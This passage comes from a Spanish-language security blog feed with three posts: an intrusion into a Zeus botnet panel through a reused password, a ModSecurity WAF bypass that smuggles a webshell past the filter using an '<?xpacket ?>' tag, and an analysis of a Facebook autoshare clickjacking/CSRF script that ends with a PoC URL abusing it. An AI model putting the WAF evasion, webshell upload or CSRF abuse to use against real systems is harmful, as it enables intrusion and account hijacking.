href="http://1.bp.blogspot.com/-Z-BLymwqX3I/VZ3XAxTKAcI/AAAAAAAAAoA/2mnHU_o4P-I/s1600/conf.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://1.bp.blogspot.com/-Z-BLymwqX3I/VZ3XAxTKAcI/AAAAAAAAAoA/2mnHU_o4P-I/s1600/conf.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">DB config hosting2.com</td></tr></tbody></table><br />Parece que el administrador de Evilnet <b>no tiene buena memoria</b> y prefiere usar <b>la misma llave</b> para todo, podría apostar que este <b>"descuido"</b> por llamarlo de manera elegante, se repite en los demás dominios bajo su autoría. Con este criterio quien sabe, si llegara a probar, hasta me podría cargar el facebook y el twitter del admin o hasta la sesión ssh personal, <b>espero no llegarle hasta abajo de la cama</b> jeje!.<br /><br />Pero en fin ya estaba dentro de <b>hosting2.com</b>, solo me faltaba escalar hasta <b>hosting1.com</b>, lo primero que hice fue tratar de leer el fichero de configuración de la botnet que se encuentra en el directorio base <b>/system/config.php</b>, mediante la creación de un <b>enlace simbólico</b>, pero para mi mala suerte no funciono. Entonces recordé el descuido del administrador e intente ingresar con la <b>llave maestra</b> por así decirlo, mediante otro usuario en la db que pertenezca a <b>hosting1.com</b>, por lo que veía, la estrutura de nombres tiene la siguiente regla:<br /><br /><b>"Nombre que hace referencia al dominio"_XXXXXXX</b><br /><br />ya había intentado loguearme como <b>hosting1_xxxxxxx</b>, entonces fui probando diversas combinaciones de usuarios.<br /><br />Hasta que logre ingresar como <b>hosting1</b> solamente, el cual tenia acceso a todas las dbs dentro de la aplicación.</div><div style="text-align: left;"></div><div style="text-align: left;"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-CvTT9J1koe8/VZ3Vc8Ib5rI/AAAAAAAAAn0/FWjIur3erpo/s1600/dbs.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-CvTT9J1koe8/VZ3Vc8Ib5rI/AAAAAAAAAn0/FWjIur3erpo/s1600/dbs.png" /></a></div><br /><br />Ya habiendo identificado la preciada base de datos.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-Cr4OEHcrdew/VZ3aEA7hEgI/AAAAAAAAAoM/vNpJ7_9axN8/s1600/db_zeus.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-Cr4OEHcrdew/VZ3aEA7hEgI/AAAAAAAAAoM/vNpJ7_9axN8/s1600/db_zeus.png" /></a></div><br /><br />Restaba consultar las credenciales en la tabla <b>cp_users</b> y rogar obtener el <b>hash md5 en claro</b>.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-U93VW2Q8q2w/VZ3a9f_XJgI/AAAAAAAAAoU/nxxBChJSkfo/s1600/admin.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-U93VW2Q8q2w/VZ3a9f_XJgI/AAAAAAAAAoU/nxxBChJSkfo/s1600/admin.png" /></a></div><br /><br />Afortunadamente el hashe del admin estaba presente en <a href="http://md5online.org/">md5online</a>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-BFOp4gfL4AY/VZ3cHgtaKDI/AAAAAAAAAog/DnwSu_ld3KM/s1600/hash.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-BFOp4gfL4AY/VZ3cHgtaKDI/AAAAAAAAAog/DnwSu_ld3KM/s1600/hash.png" /></a></div><br /><br /><br /><h2 style="text-align: left;">&nbsp;La Zeus </h2></div><div style="text-align: left;">Una vez dentro termine un poco decepcionado al respecto, creí que podía encontrarme con una mayor cantidad de bots, y para peor no había uno solo en pie.<br /><br />&nbsp;</div><div style="text-align: left;"></div><div style="text-align: left;"><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-Hl8sSZD7K_U/VZ3fSrC4u_I/AAAAAAAAAos/RULPk2xcxW0/s1600/bots.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-Hl8sSZD7K_U/VZ3fSrC4u_I/AAAAAAAAAos/RULPk2xcxW0/s1600/bots.png" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br />Aunque contaba con una respetable cantidad de reportes sobre credenciales <b>pop3</b> y <b>http</b>.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-SRZ7DGf6TSY/VZ7iGCGZHqI/AAAAAAAAApA/MymM5UKD9-E/s1600/reports.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-SRZ7DGf6TSY/VZ7iGCGZHqI/AAAAAAAAApA/MymM5UKD9-E/s1600/reports.png" /></a></div><br /><br />Una cosa interesante, es que el reports path de la botnet apuntaba al home de <b>hosting1</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-rQZ9XKL0MDE/VZ7quIKtCGI/AAAAAAAAApQ/ldrQzyTQkiw/s1600/paths.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-rQZ9XKL0MDE/VZ7quIKtCGI/AAAAAAAAApQ/ldrQzyTQkiw/s1600/paths.png" /></a></div><br />Por lo tanto podía navegar libremente a través del file browser y descargar ficheros a diestra y siniestra.</div><div style="text-align: left;"></div><div style="text-align: left;"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-Fdd7Hbj45X0/VZ7rI0vfvBI/AAAAAAAAApY/_IT7EupKbRE/s1600/file_browser.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-Fdd7Hbj45X0/VZ7rI0vfvBI/AAAAAAAAApY/_IT7EupKbRE/s1600/file_browser.png" /></a></div><br /><br />De no haber sido así, solo tenia que ir a <b>options</b> y editar el path con tantos directorios transversales sean necesarios para llegar al home.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-q9ib50b8lBY/VZ7reyXMllI/AAAAAAAAApg/u7GFrVNgXOE/s1600/back.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-q9ib50b8lBY/VZ7reyXMllI/AAAAAAAAApg/u7GFrVNgXOE/s1600/back.png" /></a></div><br /><br /></div></div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Engañando al WAF con XMP]]></title>
    <link href="http://securitysignal.github.io/blog/2015/05/25/enganando-el-waf-con-xmp/"/>
    <updated>2015-05-25T19:46:00-07:00</updated>
    <id>http://securitysignal.github.io/blog/2015/05/25/enganando-el-waf-con-xmp</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-VPbYUIQ5Cm0/VWPXlLASkXI/AAAAAAAAAk4/txeDNIAPNgo/s1600/image.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="200" src="http://1.bp.blogspot.com/-VPbYUIQ5Cm0/VWPXlLASkXI/AAAAAAAAAk4/txeDNIAPNgo/s320/image.jpg" width="320" /></a></div><br /><b><br /></b><b>By [Q]3rV[0]</b><br /><br />Me encontraba tratando de acceder a un hosting por <b>X</b> motivos, digamos que había <b>"algo"</b> interesante para llevarlo a uno a meterse donde no lo invitan,<br /><a name='more'></a> probablemente mas adelante le dedique un apartado en este blog a ese <b>"algo"</b>, pero por ahora se los dejare picando. Una vez que había logrado evadir el formulario de autentificación que me llevaba a la zona del admin lo demás parecía sencillo, subir shell mediante uno de los uploads. Había dos tipos: de imagenes y de ficheros pdf.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-qHrJpwxz4_8/VWODyZb5-LI/AAAAAAAAAjc/d6MbHFmagFQ/s1600/1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-qHrJpwxz4_8/VWODyZb5-LI/AAAAAAAAAjc/d6MbHFmagFQ/s1600/1.png" /></a></div><br /><br />Este ultimo no realizaba ningún tipo de control sobre la extención del archivo que se le pasaba, pero al momento de enviar la shell era redirigido hacia una respuesta 406.<b></b><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-vL8obXgSQ-g/VWOGZakRDxI/AAAAAAAAAjo/XwkFJsktvy4/s1600/2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-vL8obXgSQ-g/VWOGZakRDxI/AAAAAAAAAjo/XwkFJsktvy4/s1600/2.png" /></a></div><br /><br /><h2 style="text-align: center;"><b>&nbsp;</b>Me suena a WAF!, ¿sera ModSec?&nbsp;</h2><h2 style="text-align: center;">&nbsp;</h2>Al comienzo creí que el WAF filtraba funciones peligrosas como <b>popen</b>, <b>system</b>, <b>shell_exec</b>, etc, pero a medida que probaba me fui dando cuenta de que no permitía la inclusión de los tags <b>&lt;? ?&gt;</b> directamente. Cada vez que trataba de evadir las restricciones para colar mi código seguía recibiendo el cachetazo en seco del 406, cuando se me ocurrió que podía desactivar <b>ModSec</b> con un <b>.htaccess</b> fue en vano, el 406 seguía ahí. Así que ya en las ultimas a punto de desistir tuve la idea de embeber codigo php en el <b>EOF</b> de una imagen del tipo png, y si!, finalmente había subido exitosamente la shell!, pero al momento de llamarla <b>no se ejecutaba!</b>, ¿por qué?.<br /><br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-z7muMlZpK2w/VWONuZR6BII/AAAAAAAAAkA/4UJ0G5PH4iU/s1600/4.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-z7muMlZpK2w/VWONuZR6BII/AAAAAAAAAkA/4UJ0G5PH4iU/s1600/4.png" /></a></div><br /><br />Por lógica no tendría que haber problema, se tendrían que visualizar los caracteres ilegibles seguidos de mi webshell, <b>esto ya me estaba frustrando</b>. Supuse que quizá se trataba de algún tag abierto dentro del source de la imagen, así que me puse a relojear el code para encontrarme con una cadena que llamo poderosamente mi atención.<br /><br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-4Kv8BGyKE9g/VWOJzrN_bTI/AAAAAAAAAj0/o-erLJuZ_IY/s1600/3.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-4Kv8BGyKE9g/VWOJzrN_bTI/AAAAAAAAAj0/o-erLJuZ_IY/s1600/3.png" /></a></div><br /><br /><br />¿Por que el <b>WAF</b> no saltaba?, si incluía los tags <b>&lt;? ?&gt; </b>.<br /><br /><br /><h2 style="text-align: center;">Extensible Metadata Platform (XMP)</h2><h2 style="text-align: center;">&nbsp;</h2><b>XMP</b> es un estándar ISO creado por adobe para el <b>registro de metadatos en formato XML</b> en archivos pdf e imágenes.<br /><br />Para cerciorarme de que el <b>WAF</b> realmente no restringía el pasaje de la cadena <b>&lt;?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?&gt;</b> decidí subirla en limpio.<br /><br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-V4Fv3oV5Xwk/VWOQZ625NOI/AAAAAAAAAkM/NrmvRV-MJ3w/s1600/5.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-V4Fv3oV5Xwk/VWOQZ625NOI/AAAAAAAAAkM/NrmvRV-MJ3w/s1600/5.png" /></a></div><br />Evidentemente había logrado insertar los tags sin recibir un 406 a cambio!, por supuesto al momento de ejecutar el script aparecía un error de sintaxis debido a que lo que se encontraba entre <b>&lt;? ?&gt;</b> no se trataba de una estructura PHP valida, solo faltaba saber <b>¿hasta que punto controlaba el WAF la regla de la cabecera XMP?</b>.<br /><br />Jugando un poco con el string a través de ensayo y error, llegue a la conclusión de que los tags podían incluirse siempre y cuando se respete la siguiente regla.<br /><br /><br /><pre class="brush: php">&lt;?xpacket ?&gt;<br /></pre><br /><br />Entonces para disfrazar esta oportunidad y que mi script pasara desapercibido ante ModSec, se me ocurrió crear una función llamada xpacket que iba a contener la instrucción a ejecutar, en este caso descargar una webshell en el servidor.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-N6SypFtsGys/VWOWatZcJ0I/AAAAAAAAAkg/pxPQnrBBeEM/s1600/7.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-N6SypFtsGys/VWOWatZcJ0I/AAAAAAAAAkg/pxPQnrBBeEM/s1600/7.png" /></a></div><br /><br />De esta manera logre hacer a un lado las restricciones para tener una consola de comandos web limpia dentro del hosting. <br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-AUc4BKlNbzM/VWOYUv_jIzI/AAAAAAAAAko/HD6n5xPlrtI/s1600/6.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-AUc4BKlNbzM/VWOYUv_jIzI/AAAAAAAAAko/HD6n5xPlrtI/s1600/6.png" /></a></div><br /><br />Probablemente existan muchas otra maneras de saltarse el firewall web, pero esta me pareció de los mas interesante, además de que surgió de la persistencia con un toque de suerte ;) <br /><br />Saludos!]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Analizando JS Malicioso AutoLike/AutoShare]]></title>
    <link href="http://securitysignal.github.io/blog/2015/05/12/analizando-js-malicioso/"/>
    <updated>2015-05-12T23:21:00-07:00</updated>
    <id>http://securitysignal.github.io/blog/2015/05/12/analizando-js-malicioso</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"><a href="https://blog.kaspersky.com/files/2012/12/malware-2012.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blog.kaspersky.com/files/2012/12/malware-2012.jpg" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: right;"><br /></div><div style="text-align: left;">Hoy quiero contarles un rápido análisis que realice de un archivo javascript malicioso que permite realizar AutoShares y AutoLikes en facebook.<br /><a name='more'></a><br />Como todo análisis tiene una historia previa, navegando la red social como usuario habitual de facebook, encontré un articulo que llamo mi atención, al acceder al mismo advertí una pequeña ventana modal el cual me informaba que para cerrarla debía presionar la X... Esto ya me olía mal, pero confiado de mis conocimientos decidí seguir adelante. En caso de un script malicio tendría en mis manos algo interesante por el cual escribir.<br /><br />Al dar 2 click en la X y ver que la ventana modal no cerraba saltaron mis sospechas y lo primero que revise fue mi muro de Facebook, donde por cuasi arte de magia había compartido una publicación sin mi consentimiento. <br /><br />Como no soy un usuario asustadizo lo primero que me propuse era investigar donde estuvo la trampa, de todas formas, si hubiera sido algo peor, ya seria parte de alguna botnet. No perdía nada con seguir el juego!<br /><br />Primero analice velozmente el html, detectando un iframe que se cargaba sobre la X.</div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: center;"><br /></div><div style="text-align: center;"><a href="http://3.bp.blogspot.com/-4AfGl4h1Dnc/VVLXZ45mZnI/AAAAAAAAAfY/oeyWJ_QGVHA/s1600/mal1.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="360" src="http://3.bp.blogspot.com/-4AfGl4h1Dnc/VVLXZ45mZnI/AAAAAAAAAfY/oeyWJ_QGVHA/s640/mal1.png" width="640" /></a></div><div style="text-align: left;"><br />para mi sorpresa lo que había sobre la X en realidad era un formulario HTML con varios input con values predefinidos ocultos y maquillados con un poco de css.</div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-yki5h2UBLV4/VVLYDolYj0I/AAAAAAAAAfo/eMx28Wdf2sU/s1600/mal2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="360" src="http://3.bp.blogspot.com/-yki5h2UBLV4/VVLYDolYj0I/AAAAAAAAAfo/eMx28Wdf2sU/s640/mal2.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-tESNp4gKQYQ/VVLYDtje83I/AAAAAAAAAfs/zlUEDH135PA/s1600/mal3.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="360" src="http://3.bp.blogspot.com/-tESNp4gKQYQ/VVLYDtje83I/AAAAAAAAAfs/zlUEDH135PA/s640/mal3.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Lo interesante de esto fue el value de uno de sus input.</div><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-W9i0B46osHw/VVLZAKsaCZI/AAAAAAAAAgA/chPE_GDRx6Q/s1600/mal2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="360" src="http://1.bp.blogspot.com/-W9i0B46osHw/VVLZAKsaCZI/AAAAAAAAAgA/chPE_GDRx6Q/s640/mal2.png" width="640" /></a></div><div style="text-align: left;"><br />Que para mi poca sorpresa era un link de facebook:<br /><br /><a href="https://www.facebook.com/groups/361531944052219/permalink/362524573952956/">https://www.facebook.com/groups/361531944052219/permalink/362524573952956/</a><br /><br />Los que hemos trabajado con el API de facebook o aquellos curiosos que han estudiado que son los números de las url de facebook podrán ver a simple vista<br />que el primer numero <a href="https://www.facebook.com/groups/361531944052219/permalink/362524573952956/">361531944052219</a> identifica a un grupo y el siguiente numero <a href="https://www.facebook.com/groups/361531944052219/permalink/362524573952956/">362524573952956</a> identifica a una publicación dentro del grupo.<br /><br />Sin dudarlo lo visite para ver a donde me llevaba.</div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-dTei2yickBQ/VVLaD1F-eLI/AAAAAAAAAgI/wy4BGB1rBbA/s1600/grupo.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="400" src="http://4.bp.blogspot.com/-dTei2yickBQ/VVLaD1F-eLI/AAAAAAAAAgI/wy4BGB1rBbA/s400/grupo.png" width="332" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Con esto detectamos que el Usuario <b>Dario Lopez</b> del grupo Noticias Importantes Mundial esta dispersando malware con el fin de hacer popular una nota o un sitio web. <br /><br />A simple vista el perfil de Dario Lopez, no parece un Perfil falso ya que posee una cantidad considerable de amistades y fotos familiares concretas.<br /><br /><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-tS6R0tzTLPA/VVLa6ESekfI/AAAAAAAAAgQ/YrSVnrUENRg/s1600/malfacebook.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="236" src="http://1.bp.blogspot.com/-tS6R0tzTLPA/VVLa6ESekfI/AAAAAAAAAgQ/YrSVnrUENRg/s640/malfacebook.png" width="640" /></a></div>No puedo decir si <b>Dario Lopez</b> es la mente detrás de este malware, pero no hay que descartar que por "coincidencia" es un <b>"profesional"</b> (Si lo remarco!) del área informática según su información y además es administrador del sitio <b>http://laferia.do</b>, casualmente el dominio que hospeda el fichero analizado también es <b>.do</b>. Muchos dirán que puede ser pura casualidad, pero cuando muchas casualidades convergen en el mismo punto hay que mantenernos atentos.</div><div style="text-align: left;"><br /><div style="text-align: center;"><a href="http://2.bp.blogspot.com/-r24QXdH7EnQ/VVLbV74FnwI/AAAAAAAAAgY/8w2VZVGQeVc/s1600/data.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-r24QXdH7EnQ/VVLbV74FnwI/AAAAAAAAAgY/8w2VZVGQeVc/s1600/data.png" /></a></div>Además, existen publicaciones de <b>Dario Lopez</b> exponiendo de forma publica que el se encarga del SEO y posicionamiento del sitio <b>http://enminutos.do<br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-hD1H9to59nw/VVkow_kCgtI/AAAAAAAAAjA/PU2jfBfD3JE/s1600/Screenshot_2015-05-14-23-53-29.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="640" src="http://4.bp.blogspot.com/-hD1H9to59nw/VVkow_kCgtI/AAAAAAAAAjA/PU2jfBfD3JE/s640/Screenshot_2015-05-14-23-53-29.png" width="360" /></a></div><br />Muchos Analistas estarían feliz con esta información, pero yo quise llegar un poco mas lejos.</div><div style="text-align: left;"></div><div style="text-align: left;"><br />Todo formulario html debe apuntar a algún lado y esta no es la excepción.</div><div style="text-align: left;">Este formulario envía los datos a:<br /><a href="http://enminutos.do/v1/wp-content/plugins/gereshare/comp.php">http://enminutos.do/v1/wp-content/plugins/gereshare/comp.php</a><br /><br />En este punto dije, espero que este sujeto no permita Directory Listing, pero como era de esperar sus habilidades dejan mucho que desear.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-ol9k2qmFoQM/VVLdSJE-lgI/AAAAAAAAAg0/sZGNm0Iet74/s1600/malwarePath.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="360" src="http://4.bp.blogspot.com/-ol9k2qmFoQM/VVLdSJE-lgI/AAAAAAAAAg0/sZGNm0Iet74/s640/malwarePath.png" width="640" /></a></div><div style="text-align: center;"><br /></div><br />En el la raiz del sitio, podemos observar varios archivos interesantes, entre los cuales resaltan a simple vista 3.<br /><b><br />comp.php</b> (El cual seria el encargado de compartir publicaciones)<br /><b>autolikewp.php</b> (El encargado de los likes)<br /><b>wppanel.php</b> (Probablemente el panel de administración de esta pseudobotnet js)<br /><br />Al abrir el archivo Ok.php podemos ver el mensaje que nos devuelve la ventana modal, que nos solicita clickear 2 veces la X.<br /><br /><div style="text-align: center;"><a href="http://2.bp.blogspot.com/-uZzGDVC7k7M/VVLgLMl2atI/AAAAAAAAAhY/g8MP_WgKvT4/s1600/ok.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="224" src="http://2.bp.blogspot.com/-uZzGDVC7k7M/VVLgLMl2atI/AAAAAAAAAhY/g8MP_WgKvT4/s640/ok.png" width="640" /></a></div></div><div style="text-align: left;"></div><div style="text-align: left;"><br />Analizando como funcionaba el archivo comp.php en base al formulario html, se puede apreciar que el mismo obtiene como parametro GET (<b>?n=</b>) una url de facebook y gracias a ello, realiza el share de la publicación en nuestro muro.<br /><br /><div style="text-align: center;"><a href="http://2.bp.blogspot.com/-FXSHaNWQMwQ/VVLgvxmsXKI/AAAAAAAAAhg/uAAs4eSMkYk/s1600/maltrick.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="360" src="http://2.bp.blogspot.com/-FXSHaNWQMwQ/VVLgvxmsXKI/AAAAAAAAAhg/uAAs4eSMkYk/s640/maltrick.png" width="640" /></a></div>También se puede apreciar el pequeño icono <b>Recommander</b> que genera, el cual esta situado sobre la X de la primera ventana modal de forma oculta.<br /><br />Al presionar por primera vez el icono, la publicación es compartida automáticamente en nuestro muro. </div><div style="text-align: left;"><br /><div style="text-align: center;"><a href="http://4.bp.blogspot.com/-s5Rctqb7g0U/VVLhyRJCazI/AAAAAAAAAho/N2W2wIO6AIA/s1600/comp.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="367" src="http://4.bp.blogspot.com/-s5Rctqb7g0U/VVLhyRJCazI/AAAAAAAAAho/N2W2wIO6AIA/s400/comp.png" width="400" /></a></div><div style="text-align: center;"><b><br />¿Pero como es esto posible?</b></div>Si analizamos las solicitudes que realizan al pinchar sobre el icono con Live HTTP Headers, vemos que en realidad <b>comp.php</b> realiza una solicitud cruzada (CSRF) a facebook en la siguiente url:<br /><br /><a href="http://a/" target="_blank">https://www.facebook.com/plugins/like.php?action=recommend&amp;locale=fr_FR&amp;href=https://www.facebook.com/groups/361531944052219/permalink/362524573952956/</a><br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-6NNlHnX6NO4/VVLjnPYI87I/AAAAAAAAAh0/6zxiV0L1Qxw/s1600/csrf.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-6NNlHnX6NO4/VVLjnPYI87I/AAAAAAAAAh0/6zxiV0L1Qxw/s1600/csrf.png" /></a></div><div style="text-align: center;"><br /></div><br />Luego de compartir, sorprendentemente se genera otro icono que solicita volver a pinchar sobre el (clickear 2 veces sobre la X cobra sentido).</div><div style="text-align: left;"><br />Este segundo click, obtiene nuestra lista de amigos: solicitando la siguiente url, y enviando como parametros nuestro user id.<br /><br /><div style="text-align: center;"><a href="http://3.bp.blogspot.com/-zyVW8dBzn10/VVLl1ezidVI/AAAAAAAAAiE/JmbI8B-zVlE/s1600/liveb.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="316" src="http://3.bp.blogspot.com/-zyVW8dBzn10/VVLl1ezidVI/AAAAAAAAAiE/JmbI8B-zVlE/s640/liveb.png" width="640" /></a></div></div><div style="text-align: left;"><br /><a href="https://www.facebook.com/ajax/chat/buddy_list.php">https://www.facebook.com/ajax/chat/buddy_list.php</a><br />POST DATA:<br /><br />user=<b>XXXXXXXXXXXX</b>&amp;cached_user_info_ids=100000880896707%2C1539278499%2C1039286048%2C1672917463%2C1159013345%2C100002303816403%2C1579914094%2C100002280882851%2C1294812174%2C1485503826%2C100006827621101%2C1435971856%2C1420035217%2C1549101887%2C100000243965841%2C1189075482%2C1358504234%2C100002206144671%2C100000304744896%2C1541655589%2C100000323464648%2C100005337588429%2C1183924717%2C100000154385259%2C541587768%2C1169111031%2C502648835%2C1019076152%2C1427687216%2C1075931220%2C100000259832559%2C1014462015%2C1797529367%2C1311745204%2C100000621867724%2C1594688351%2C100001114774263%2C100006411360957%2C1585235871%2C1347135662%2C1516698859%2C1460880717&amp;fetch_mobile=false&amp;__user=100000880896707&amp;__a=1&amp;__dyn=7nmajEyl2lm9o-t2u5bGya4Au7pEsx6iqAdy9VQC-K26m6oKewWhEyfyUnwPUS2O4K5ebAxacFoy8ACxuFmdAw&amp;__req=1y&amp;fb_dtsg=AQGj5Kcxo0bW&amp;ttstamp=2658171106537599120111489887&amp;__rev=1733369<br /><br />Esto da como resultado un json con todos los id de los conectados al chat de facebook y su estado actual (Online, Offline).<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-edaNlPNjJqU/VVLlU-kqv5I/AAAAAAAAAh8/cm69atE7Two/s1600/budylist.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="360" src="http://4.bp.blogspot.com/-edaNlPNjJqU/VVLlU-kqv5I/AAAAAAAAAh8/cm69atE7Two/s640/budylist.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Luego de esto hace solicitudes recursivas para obtener información de cada uno de nuestros contactos del chat.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-hGuu0aKZuAA/VVLmUIggz2I/AAAAAAAAAiM/QwG3nqIsOIM/s1600/userinfo.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="228" src="http://1.bp.blogspot.com/-hGuu0aKZuAA/VVLmUIggz2I/AAAAAAAAAiM/QwG3nqIsOIM/s640/userinfo.png" width="640" /></a></div><div style="text-align: left;">Esto da como resultado información primordial para contactar a cada uno de estos usuarios. <br /><br />Entre esta información se encuentra el id de facebook de cada Amigo del chat, y su url de facebook.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-Ek6Iriuon3s/VVLmnl6ExJI/AAAAAAAAAiU/btkNk4zFuW8/s1600/info.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="360" src="http://3.bp.blogspot.com/-Ek6Iriuon3s/VVLmnl6ExJI/AAAAAAAAAiU/btkNk4zFuW8/s640/info.png" width="640" /></a></div><div style="text-align: left;">Con esta información el atacante puede realizar una campaña de spam buscando obtener cada vez mas víctimas, con esta misma metodología el script intenta enviar spam a cada uno de los usuarios del chat, pero por motivos que desconozco el script falla en este punto. Probablemente protección contra spam de facebook.<br /><br />Al entender como funciona el script no tarde mucho en desarrollar un metodo que me permitía aprovechar la situación por medio de un pequeño <b>PoC</b> que le permite a cualquier persona utilizar este script para realizar campaña sobre sus propios sitios.<br /><br />Solo basta con cambiar parámetro enviado a <b>comp.php</b> de la siguiente forma:<br /><br /><a href="http://enminutos.do/v1/wp-content/plugins/gereshare/comp.php?n=">http://enminutos.do/v1/wp-content/plugins/gereshare/comp.php?n=</a><b>URL</b></div></div></div></div><div style="text-align: left;"><br />URL puede apuntar a una pagina de facebook, a una publicación personal, o a una publicación dentro de un grupo.<br /><br />En este caso utilice como URL la paguina de facebook de <b>SecuritySignal</b><br /><br /><a href="http://enminutos.do/v1/wp-content/plugins/gereshare/comp.php?n=https://www.facebook.com/pages/Security-Signal/1582089988673754?fref=ts">http://enminutos.do/v1/wp-content/plugins/gereshare/comp.php?n=https://www.facebook.com/pages/Security-Signal/1582089988673754?fref=ts</a><br /><br />Vemos con este sencillo PoC como fuimos capaces de reproducir a nuestro favor el script malicioso.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-q6jE7jI8Cjw/VVLpKR6I7kI/AAAAAAAAAig/s2a3VOzouEU/s1600/sec.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="298" src="http://4.bp.blogspot.com/-q6jE7jI8Cjw/VVLpKR6I7kI/AAAAAAAAAig/s2a3VOzouEU/s640/sec.png" width="640" /></a></div><div style="text-align: 